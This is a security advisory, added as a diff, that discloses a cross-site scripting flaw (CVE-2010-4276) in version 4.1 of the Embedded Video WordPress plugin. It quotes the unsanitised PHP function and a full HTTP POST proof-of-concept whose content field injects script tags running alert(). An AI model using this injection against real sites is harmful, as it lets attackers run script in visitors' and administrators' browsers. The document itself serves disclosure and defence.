@@ -1,0 +1,104 @@
+[CONVISO-10-005] - Embedded Video WordPress Plugin Cross Site Vulnerability
+
+1. Advisory Information
+    Conviso Advisory ID: CONVISO-10-005
+    CVE ID: CVE-2010-4276
+    CVSS v2: 6.4
+    Date: 2010-12-17
+
+2. Affected Components
+    Version 4.1 of Embedded Video Word Press Plugin.
+
+3. Description
+    Embedded Video is a WordPress Plugin created by Jovel Stefan to easily embedded videos in blog
+    posts. The videos can be uploaded to the web server or come from external portals (like YouTube,
+    Google Video and others) and links to the video on the video portal or for download of the video
+    can be automatically generated as well.
+
+    The plugin has a Cross Site Script (XSS) vulnerability.
+
+4. Details
+    The file lembedded-video.php does not sanitize content variable, it is possible to inject
+    malformed data by Javascript.
+
+    Code affected:
+
+    function embeddedvideo_plugin($content) {
+    $output = preg_replace_callback(REGEXP_1, 'embeddedvideo_plugin_callback', $content);
+    $output = preg_replace_callback(REGEXP_2, 'embeddedvideo_plugin_callback', $output);
+    $output = preg_replace_callback(REGEXP_3, 'embeddedvideo_plugin_callback', $output);
+    return ($output);
+    }
+
+    Request:
+
+    http://<server>/wordpress/wp-admin/post.php
+    POST /wordpress/wp-admin/post.php HTTP/1.1
+    Host: <server>
+    User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.12) Gecko/20101026
+    Firefox/3.6.12
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-us,en;q=0.5
+    Accept-Encoding: gzip,deflate
+    Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+    Keep-Alive: 115
+    Connection: keep-alive
+    Referer: http://<server>/wordpress/wp-admin/post.php?post=8&action=edit&message=1
+    Cookie:wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin
+    %7C1290110435%7C7f9fa1a66aec0259906ea15086aea0c8; wp-settings-time-1=1289940308;
+    wordpress_test_cookie=WP+Cookie+check;
+    wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin
+    %7C1290110435%7C68b064d813dd8bfaa5d2d2cdf757848e; wp-settings-1=m1%3Do
+    %26m6%3Dc%26m7%3Do
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 1786
+    _wpnonce=b2bc367f9c&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D8%26action%3Ded
+    it%26message%3D1&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=post&
+    original_post_status=publish&referredby=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php
+    %3Fpost%3D8%26action%3Dedit&_wp_original_http_referer=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-
+    admin%2Fpost.php%3Fpost%3D8%26action%3Dedit&post_ID=8&autosavenonce=96293917c9&meta-box-order-
+    nonce=c2fe5535c4&closedpostboxesnonce=bad9dc775b&wp-preview=&hidden_post_status=publish&post_sta
+    tus=publish&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=
+    &mm=11&jj=17&aa=2010&hh=00&mn=05&ss=33&hidden_mm=11&cur_mm=11&hidden_jj=17&cur_jj=17&hidden_aa=2
+    010&cur_aa=2010&hidden_hh=00&cur_hh=00&hidden_mn=05&cur_mn=36&original_publish=Update&save=Updat
+    e&post_category%5B%5D=0&post_category%5B%5D=1&newcategory=New+Category+Name&newcategory_parent=-
+    1&_ajax_nonce-add-category=62352e38f5&tax_input%5Bpost_tag%5D=&newtag%5Bpost_tag%5D=&post_title=
+    testando&samplepermalinknonce=4a0d9c8491&content=%5Byoutube+%3Cscript+type%3D%22text%2Fjavascrip
+    t%22%3E%2F%2F+%3C%21%5BCDATA%5B%0D%0Aalert%281%29%0D%0A%2F%2F+%5D%5D%3E%3C%2Fscript%3E+%3Cscript
+    +type%3D%22text%2Fjavascript%22%3E%2F%2F+%3C%21%5BCDATA%5B%0D%0Aalert%282%29%0D%0A%2F%2F+%5D%5D%
+    3E%3C%2Fscript%3E%5D&excerpt=&trackback_url=&meta%5B6%5D%5Bkey%5D=_edit_last&_ajax_nonce=5453d93
+    de8&meta%5B6%5D%5Bvalue%5D=1&meta%5B9%5D%5Bkey%5D=_edit_lock&_ajax_nonce=5453d93de8&meta%5B9%5D%
+    5Bvalue%5D=1289954192&meta%5B8%5D%5Bkey%5D=_wp_old_slug&_ajax_nonce=5453d93de8&meta%5B8%5D%5Bval
+    ue%5D=&metakeyinput=&metavalue=&_ajax_nonce-add-meta=9453fa7f77&advanced_view=1&comment_status=o
+    pen&ping_status=open&post_name=testando&post_author_override=1
+
+5. Solution
+    The developer replied to the advisory in a very responsible manner but unfortunately there will
+    be no updates due to the fact that this component is not maintained anymore.
+
+6. Credits
+    Wagner Elias <welias@conviso.com.br>
+
+7. Report Timeline
+    October 20, 2010 - Issue discovered by Wagner Elias at Conviso Labs.
+    October 22, 2010 - Issue informed to the author.
+    October 30, 2010 - Author informed that the plugin is not maintained anymore.
+    December 17, 2010 - Security Advisory published.
+
+8. References
+
+9. About Conviso
+    Conviso is a consulting company specialized on application security. Our values are based on the
+    allocation of the adequate competencies on the field, a clear and direct speech with the market,
+    collaboration and partnership with our customers and business partners and constant investments
+    on methodology and research improvement. For more information about our company and services
+    provided, please check our website at www.conviso.com.br.
+
+10. Copyright and Disclaimer
+    The information in this advisory is Copyright 2010 Conviso Application Security S/A and provided
+    so that the society can understand the risk they may be facing by running affected software,
+    hardware or other components used on their systems. In case you wish to copy information from
+    this advisory, you must either copy all of it or refer to this document (including our URL). No
+    guarantee is provided for the accuracy of this information, or damage you may cause your systems
+    in testing.
+
